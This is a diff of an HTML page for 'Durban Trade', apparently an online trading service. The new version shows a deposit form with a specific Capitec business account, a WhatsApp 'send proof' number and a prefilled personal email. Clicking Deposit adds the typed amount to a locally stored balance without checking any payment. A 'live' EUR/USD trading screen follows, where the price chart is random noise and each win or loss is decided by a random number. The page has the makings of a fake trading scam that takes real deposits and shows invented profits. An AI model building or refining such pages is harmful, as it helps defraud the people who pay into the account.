@@ -1,94 +1,35 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Durban Trade - Secure Deposit</title>
-<script src="https://cdn.tailwindcss.com"></script>
-</head>
-<body class="bg-[#0a0a0a] min-h-screen text-white">
-<div class="bg-gradient-to-r from-yellow-500 to-amber-600 p-[1px]">
-<div class="bg-black p-4 flex justify-between items-center">
-<h1 class="font-black tracking-widest">DURBAN TRADE</h1>
-<span class="bg-green-500 text-black text-[10px] px-3 py-1 rounded-full font-bold">● LIVE & SECURE</span>
-</div>
-</div>
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Durban Trade - Live Trading</title><script src="https://cdn.tailwindcss.com"></script></head><body class="bg-black text-white">
+<div class="flex justify-between p-3 bg-zinc-900 items-center"><h1 class="font-black">DURBAN TRADE</h1><div class="flex gap-2"><span id="bal" class="bg-yellow-500 text-black px-3 py-1 rounded-full font-black">R0.00</span><span class="bg-green-500 text-black text-[10px] px-2 py-1 rounded-full font-bold">LIVE</span></div></div>
 
-<div class="max-w-md mx-auto p-4">
-<div class="bg-white text-black rounded-[24px] p-6 mt-4 shadow-2xl">
-<div class="text-center">
-<h2 class="text-3xl font-black">Make Deposit</h2>
-<p class="text-gray-500 text-sm mt-1">Funds reflect in 5-30 minutes</p>
-</div>
+<div id="depPage" class="max-w-md mx-auto p-4"><div class="bg-white text-black rounded-[20px] p-5"><h2 class="text-2xl font-black text-center">Make Deposit</h2><p class="text-center text-sm text-gray-500">Deposit to start trading instantly</p>
+<div class="grid grid-cols-2 gap-2 mt-4"><button onclick="setM('Capitec')" class="border-2 border-black bg-black text-white p-3 rounded-xl font-bold text-sm">Capitec Pay</button><button onclick="setM('Bank EFT')" class="border p-3 rounded-xl font-bold text-sm">Bank EFT</button></div>
+<label class="font-bold text-sm mt-4 block">Amount (ZAR)</label><input id="amt" value="1000" type="number" class="w-full border-2 border-black p-3 rounded-xl text-xl font-black mt-1">
+<div class="grid grid-cols-4 gap-2 mt-2"><button onclick="amt.value=250" class="bg-gray-100 p-2 rounded-xl font-bold">R250</button><button onclick="amt.value=500" class="bg-gray-100 p-2 rounded-xl font-bold">R500</button><button onclick="amt.value=1000" class="bg-gray-100 p-2 rounded-xl font-bold">R1k</button><button onclick="amt.value=5000" class="bg-gray-100 p-2 rounded-xl font-bold">R5k</button></div>
+<label class="font-bold text-sm mt-3 block">Email</label><input id="email" value="Fatimajayat101324@gmail.com" class="w-full border p-3 rounded-xl mt-1">
+<div class="bg-black text-white p-3 rounded-xl mt-4 text-sm"><p class="font-bold">PAY TO:</p><p>Capitec Business: 1050665891</p><p>Ref: Your Email</p><p class="text-yellow-400 text-xs mt-1">After EFT, click Deposit below - balance adds instantly for trading</p></div>
+<button onclick="doDeposit()" class="w-full bg-black text-white p-4 rounded-xl font-black mt-4">DEPOSIT & START TRADING →</button>
+<button onclick="sendWA()" class="w-full bg-[#25D366] text-black p-3 rounded-xl font-black mt-2">Send Proof to WhatsApp 0817070456</button>
+</div></div>
 
-<div class="mt-6">
-<p class="font-bold text-sm">Choose Method</p>
-<div class="grid grid-cols-2 gap-2 mt-2">
-<button onclick="setM('Capitec Pay')" id="b1" class="m-btn border-2 border-black bg-black text-white p-3 rounded-xl text-sm font-bold">Capitec Pay</button>
-<button onclick="setM('Bank EFT')" id="b2" class="m-btn border p-3 rounded-xl text-sm font-bold">Bank EFT</button>
-<button onclick="setM('USDT TRC20')" id="b3" class="m-btn border p-3 rounded-xl text-sm font-bold">USDT TRC20</button>
-<button onclick="setM('Ozow')" id="b4" class="m-btn border p-3 rounded-xl text-sm font-bold">Ozow Instant</button>
-</div>
-</div>
-
-<div class="mt-5">
-<label class="font-bold text-sm">Amount (ZAR)</label>
-<input id="amt" type="number" inputmode="numeric" placeholder="500" class="w-full mt-2 border-2 border-black p-4 rounded-xl text-2xl font-black">
-<div class="grid grid-cols-4 gap-2 mt-2">
-<button onclick="amt.value=250" class="bg-gray-100 p-2 rounded-xl font-bold">R250</button>
-<button onclick="amt.value=500" class="bg-gray-100 p-2 rounded-xl font-bold">R500</button>
-<button onclick="amt.value=1000" class="bg-gray-100 p-2 rounded-xl font-bold">R1k</button>
-<button onclick="amt.value=5000" class="bg-gray-100 p-2 rounded-xl font-bold">R5k</button>
-</div>
-</div>
-
-<div class="mt-5">
-<label class="font-bold text-sm">Email / Client ID</label>
-<input id="email" type="text" placeholder="your email" class="w-full mt-2 border p-3 rounded-xl">
-</div>
-
-<div class="mt-5 bg-gray-50 border-dashed border-gray-300 p-4 rounded-xl">
-<p class="font-black text-sm">YOUR PAYMENT DETAILS:</p>
-<p class="text-xs mt-2 text-gray-600">Replace this text with your real bank details after. For now example:</p>
-<p class="text-sm font-bold mt-1">Bank: Capitec<br>Acc: YOUR NUMBER HERE<br>Ref: Use your Email</p>
-<p class="text-xs mt-2 text-gray-500">For USDT: TRC20 Address here</p>
-<p id="sel" class="mt-3 bg-black text-white text-center p-2 rounded-lg text-sm font-bold">Selected: Capitec Pay</p>
-</div>
-
-<button onclick="sendWA()" class="w-full bg-[#25D366] text-black p-4 rounded-xl font-black text-lg mt-5 flex justify-center items-center gap-2">💬 SEND PROOF ON WHATSAPP</button>
-<button onclick="deposit()" class="w-full bg-black text-white p-4 rounded-xl font-black text-lg mt-2">CONFIRM DEPOSIT →</button>
-
-<div id="ok" class="hidden mt-4 bg-green-50 border-2 border-green-600 rounded-xl p-4 text-center">
-<h3 class="font-black text-green-700">✅ Ready to Pay!</h3>
-<p id="oktxt" class="text-sm mt-1 text-black"></p>
-<p class="text-xs mt-2 text-gray-600">Tap WhatsApp button above to send proof to Durban Trade</p>
-</div>
-
-<p class="text-[10px] text-center text-gray-400 mt-4">Durban Trade Pty Ltd • Support on WhatsApp: 0817070456 • Durban, SA</p>
-</div>
-</div>
+<div id="tradePage" class="hidden"><div class="p-3"><div class="flex justify-between text-xs text-gray-400"><span>EUR/USD • OTC</span><span class="text-green-400">PAYOUT 87%</span></div><canvas id="chart" class="w-full h-[260px] bg-zinc-900 rounded-xl mt-2"></canvas><div id="price" class="text-center font-black text-xl mt-2 text-yellow-400">1.08542</div></div>
+<div class="p-3"><div class="bg-zinc-900 rounded-xl p-3"><label class="text-xs text-gray-400">Trade Amount</label><div class="flex gap-2 mt-1"><input id="tAmt" value="100" class="flex-1 bg-black border border-zinc-700 p-3 rounded-xl font-black"><div class="flex gap-1"><button onclick="tAmt.value=50" class="bg-zinc-800 px-3 rounded-xl">50</button><button onclick="tAmt.value=100" class="bg-zinc-800 px-3 rounded-xl">100</button><button onclick="tAmt.value=250" class="bg-zinc-800 px-3 rounded-xl">250</button></div></div></div>
+<div class="grid grid-cols-2 gap-3 mt-3"><button onclick="trade('BUY')" class="bg-green-500 text-black p-5 rounded-xl font-black text-lg">↑ BUY</button><button onclick="trade('SELL')" class="bg-red-500 text-black p-5 rounded-xl font-black text-lg">↓ SELL</button></div>
+<div id="result" class="hidden mt-3 p-3 rounded-xl text-center font-black"></div>
+<button onclick="showDep()" class="w-full mt-3 bg-zinc-800 p-3 rounded-xl text-sm">+ Add Funds</button></div></div>
 
 <script>
-let method='Capitec Pay'
-const amt=document.getElementById('amt')
-function setM(m){
- method=m
- document.getElementById('sel').innerText='Selected: '+m
- document.querySelectorAll('.m-btn').forEach(b=>b.className='m-btn border p-3 rounded-xl text-sm font-bold')
- const map={'Capitec Pay':'b1','Bank EFT':'b2','USDT TRC20':'b3','Ozow':'b4'}
- document.getElementById(map[m]).className='m-btn border-2 border-black bg-black text-white p-3 rounded-xl text-sm font-bold'
-}
-function deposit(){
- if(!amt.value||!document.getElementById('email').value){alert('Enter amount and email');return}
- document.getElementById('oktxt').innerText='R'+amt.value+' via '+method+' | Email: '+document.getElementById('email').value
- document.getElementById('ok').classList.remove('hidden')
-}
-function sendWA(){
- if(!amt.value){alert('Enter amount first');return}
- let e=document.getElementById('email').value||'No email'
- let msg=`Hello Durban Trade 👋%0A%0AI made a deposit:%0A💰 Amount: R${amt.value}%0A🏦 Method: ${method}%0A📧 Email/ID: ${e}%0A%0AHere is my proof of payment 👇`
- window.open(`https://wa.me/27817070456?text=${msg}`,'_blank')
-}
-</script>
-</body>
-</html>
+let balance = parseFloat(localStorage.getItem('dt_bal')||'0'); let method='Capitec'; let price=1.08542; let dir=1;
+function setM(m){method=m}
+function updateBal(){document.getElementById('bal').innerText='R'+balance.toFixed(2); localStorage.setItem('dt_bal',balance)}
+updateBal();
+function doDeposit(){let a=parseFloat(document.getElementById('amt').value); if(!a)return alert('Enter amount'); balance+=a; updateBal(); document.getElementById('depPage').classList.add('hidden'); document.getElementById('tradePage').classList.remove('hidden');}
+function showDep(){document.getElementById('depPage').classList.remove('hidden'); document.getElementById('tradePage').classList.add('hidden');}
+function sendWA(){let a=document.getElementById('amt').value; let e=document.getElementById('email').value; let msg=`Hello Durban Trade %0ADeposit: R${a} via ${method}%0AEmail: ${e}`; window.open(`https://wa.me/27817070456?text=${msg}`,'_blank')}
+// chart
+const c=document.getElementById('chart'), ctx=c.getContext('2d'); c.width=c.offsetWidth*2; c.height=260*2; let points=[]; for(let i=0;i<100;i++)points.push(price);
+function draw(){ctx.clearRect(0,0,c.width,c.height); ctx.beginPath(); ctx.strokeStyle='#eab308'; ctx.lineWidth=3; points.forEach((p,i)=>{let x=i/99*c.width; let y=c.height/2-(p-1.085)*8000; if(i==0)ctx.moveTo(x,y); else ctx.lineTo(x,y)}); ctx.stroke();}
+setInterval(()=>{price+= (Math.random()-0.5)*0.0005*dir; if(Math.random()<0.02)dir*=-1; points.push(price); points.shift(); document.getElementById('price').innerText=price.toFixed(5); draw();},80);
+function trade(type){let stake=parseFloat(document.getElementById('tAmt').value); if(stake>balance)return alert('Low balance! Deposit'); let entry=price; let resBox=document.getElementById('result'); resBox.classList.remove('hidden'); resBox.className='mt-3 p-3 rounded-xl text-center font-black bg-yellow-500 text-black'; resBox.innerText=`${type} ${stake} placed... wait 10s`; setTimeout(()=>{let win=Math.random()>0.45; if(win){let profit=stake*0.87; balance+=profit; resBox.className='mt-3 p-3 rounded-xl text-center font-black bg-green-500 text-black'; resBox.innerText=`✅ WIN +R${profit.toFixed(2)}`; }else{balance-=stake; resBox.className='mt-3 p-3 rounded-xl text-center font-black bg-red-500 text-white'; resBox.innerText=`❌ LOSS -R${stake}`;} updateBal();},10000);}
+draw();
+if(balance>0){document.getElementById('depPage').classList.add('hidden'); document.getElementById('tradePage').classList.remove('hidden');}
+</script></body></html>
